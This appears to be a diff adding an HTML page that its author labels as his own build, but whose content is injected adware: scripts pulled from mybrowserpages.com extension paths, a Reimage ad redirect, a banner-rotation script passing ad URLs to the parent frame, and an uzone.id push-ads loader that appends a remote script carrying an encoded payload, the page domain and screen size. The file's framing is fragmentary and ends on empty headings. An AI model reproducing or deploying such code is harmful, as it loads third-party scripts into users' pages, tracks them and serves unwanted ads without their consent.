@@ -1,0 +1,103 @@
+-My build DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad (HTML Editor):
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<body>
+<img src=" http://cicloudfront.s3.amazonaws.com/uploads/1459325564790_PT_Window_300X250.gif "></img>
+<script type = "text/javascript" src=" http://mybrowserpages.com/extension/web_ads_ifrome_js/content_Ad4game.js "></script>
+<script type = "text/javascript" src=" https://mybrowserpages.com/extension/EasySearch/info.js "></script>
+<STYLE>body{margin: auto;}</STYLE><DIV><A target="_blank" href="http://clickus.reimsrvcm.com/st?cipid=7965547&excid=22&ttype=1&dast=v1_7965547_253987_3pn_29F2BDADCD2346221823321734_-1_4263267_14pt1_533_29F2BDADCD2346211637567744_m_ju_-630369207307529805_900877___2_33_4p4h_ju&cmcv=${CMCV}&compid=${COMPID}&cipp=${PRICE}&ciecp=${DTYPE}&cirp=${LAG}&position=${POS}&excid=22&cisid=29F2BDADCD2346221823321734&pix=31588938&tgt=http%3A%2F%2Fwww.reimageplus.com%2Fincludes%2Frouter_land.php%3Ftracking%3DReimageNetworkCon%26lpx%3Dslm%26banner%3DSundal%26adgroup%3D7965547%26ads_name%3D4263267%26keyword%3D1206177%26context%3Dv1_7965547_253987_3pn_29F2BDADCD2346221823321734_-1_4263267_14pt1_533_29F2BDADCD2346211637567744_m_ju_-630369207307529805_900877___2_33_4p4h_ju"><IMG border=0 width=300 height=250 id="_ci4263267_b4107127" alt="" src="http://cicloudfront.s3.amazonaws.com/uploads/1459325564790_PT_Window_300X250.gif"/></A>
+</DIV>
+
+<script type="text/javascript">
+	function GetZeroStamp()
+	{
+	    var date = new Date();
+		return date.getTime() - date.getHours()*3600000 - date.getMinutes() * 60000 -
+			date.getSeconds() * 1000 - date.getMilliseconds();
+	}
+	var rootUrl = document.location.hash.substr(1);
+	var resettimes = 1;
+	var config = {
+			banner:{
+				types:[0,1,2,3],
+				maxtimes:[6,2,3,2],
+				showed:[0,0,0,0]
+			},
+            domainname:0,
+			resettimes:0,
+			timestamp:0
+	};
+	window.addEventListener('message',function(e){
+		if(e.source != window.parent)
+			return;
+		var data = JSON.parse(localStorage.getItem("acontrol")) || config;
+		var lcresettimes = data.hasOwnProperty("resettimes") ?  data["resettimes"] : 0;
+        if ((GetZeroStamp() - data.timestamp >= 3600000 * 24) || resettimes > lcresettimes) {
+            data = config;
+			data.resettimes = resettimes;
+            data.domainname = Math.floor(Math.random()*4);
+            console.log(data.domainname);
+		}
+		var bn_should_show = 0;
+		//banner
+		var bn_showed = 0;
+		var bn_all_showed = true;
+		var banner_data = data.banner;
+		for(var i = 0; i < banner_data.types.length; i ++)
+		{
+			var atype = banner_data.types[i];
+			var maxtimes = banner_data.maxtimes[atype];
+			bn_showed = banner_data.showed[atype];
+			if (bn_showed < maxtimes) {
+				bn_all_showed = false;
+				bn_should_show = atype;
+				banner_data.showed[atype] = bn_showed + 1;
+				break;
+			}
+		}
+		if (bn_all_showed) {
+			data.banner = config.banner;
+		}
+		
+		//code
+		var banner_code = "";
+		var bn_code_pos = 1;
+		switch (bn_should_show) {
+            case 1:
+                banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_google.js';
+                break;
+            case 2:
+                banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_Adonads_Addonjet_Adcash.js';
+                break;
+            case 3:
+                banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_mygame.js';
+                break;
+			default:
+				banner_code = ('https:' == document.location.protocol ? 'https://' : 'http://')+'mybrowserpages.com/extension/web_ads_ifrome_js/content_Ad4game.js';
+				bn_code_pos = 0;
+				break;
+		}
+        var bn_show_domain = data.domainname;
+		data.timestamp = GetZeroStamp();
+		localStorage.setItem("acontrol", JSON.stringify(data));
+		var postData = {
+			bn:{
+				code: banner_code,
+				pos: bn_code_pos,
+                domain: bn_show_domain
+			}
+		};
+		window.parent.postMessage(postData,rootUrl);
+    },false);
+</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnfUhiu08s2sJ%2bIUQvnKUED98ZQwl8%2bxjvj21crrybLThlWekdvRS9myU6cRkpAZLQI2ETLYGkoh1HZmNEOpHoFlDYvamcy6%2bcYKTZI5dbRnUnBOB8%2b1QPmSCmU5brIvSYk4PlhmrNZ%2b7I6KkZJs5L4FooXnX8c4FXSQFJNnTddr0YxVaGRdV4s0DBlRmH4hpikUpjPwQb17JtDLfY%2bvPDHyr5f3kQ%2fPHlAHwHKKb7yq3rRNccLc6gt1rOcy1%2bHjSIG0jLd3V1H7M%2fkYsd1g7T4XlvAKbLCjaQ7ptDOTvKJqLgBgdVf3Fiwqt3sOEH0eaC3tHzhc28Q%2fuYjp7x3SZnKMfdLN0E7I84Fr%2fXASgGUld%2fzXJxVe4XQCPXMEQ%2fKZ2EWy2MUh2jVPgbi9EJHICbWlhemjPl9%2boU5vqClZOATd5LYAgyqEkV3fT%2fggUc4YAEKYd2j5A2CY0ay9%2bnw7tp0u2JLfEujcYmaz0Dm9dIiAdfjwyqEFIGbn2m3OAqy%2fzqbEwdKVKbsc1ggOvayKKVOQ2WC7PEkYw8aeld2DPLtgR2%2fHFDBxA3PQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+
+-HAR:
+
+-To be evaluated in console:
